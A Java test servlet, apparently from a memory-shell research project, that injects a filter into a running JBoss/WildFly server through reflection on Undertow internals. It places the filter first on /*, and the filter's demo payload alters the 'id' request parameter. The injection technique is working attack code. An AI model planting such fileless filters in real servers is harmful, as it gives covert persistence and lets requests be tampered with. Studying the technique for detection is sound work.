package org.su18.memshell.test.jboss;


import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.FilterInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

/**
 * 来自项目 https://github.com/feihong-cs/memShell
 * 亲测有效
 * 测试版本 JBoss/WildFly 18.0.0.Final
 *
 * @author su18
 */
public class AddJBossFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
			String filterName = "su18JbossFilter";
			String urlPattern = "/*";

			ServletContext context = req.getServletContext();
			Field          f       = context.getClass().getDeclaredField("deploymentInfo");
			f.setAccessible(true);
			DeploymentInfo deploymentInfo = (DeploymentInfo) f.get(context);

			//只添加一次
			Map<String, FilterInfo> filters = deploymentInfo.getFilters();
			if (!filters.containsKey(filterName)) {

				Class      clazz  = TestFilter.class;
				FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
				deploymentInfo.addFilter(filter);

				f = context.getClass().getDeclaredField("deployment");
				f.setAccessible(true);
				Field modifiersField = Field.class.getDeclaredField("modifiers");
				modifiersField.setAccessible(true);
				modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
				DeploymentImpl deployment = (DeploymentImpl) f.get(context);
				deployment.getFilters().addFilter(filter);

				// 0 表示把我们动态注册的 filter 放在第一位
				deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);

				resp.getWriter().println("jboss wildfly filter added");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


	public static class TestFilter implements Filter {

		/**
		 * 初始化 filter
		 *
		 * @param filterConfig FilterConfig
		 */
		@Override
		public void init(FilterConfig filterConfig) {
		}

		/**
		 * doFilter 方法处理过滤器逻辑
		 *
		 * @param servletRequest  ServletRequest
		 * @param servletResponse ServletResponse
		 * @param filterChain     FilterChain
		 * @throws IOException      抛出异常
		 * @throws ServletException 抛出异常
		 */
		@Override
		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
			// 给下一个过滤器
			filterChain.doFilter(new AddJBossFilter.TestFilter.FilterRequest((HttpServletRequest) servletRequest), servletResponse);
		}

		/**
		 * 销毁时执行的方法
		 */
		@Override
		public void destroy() {
		}

		/**
		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
		 */
		class FilterRequest extends HttpServletRequestWrapper {

			public FilterRequest(HttpServletRequest request) {
				super(request);
			}

			@Override
			public String getParameter(String name) {
				if ("id".equals(name)) {
					String originalId = super.getParameter(name);

					if (originalId != null && !originalId.isEmpty()) {
						int idNum = (Integer.parseInt(originalId) + 127);
						return Integer.toString(idNum);
					}
				}
				return super.getParameter(name);
			}
		}
	}
}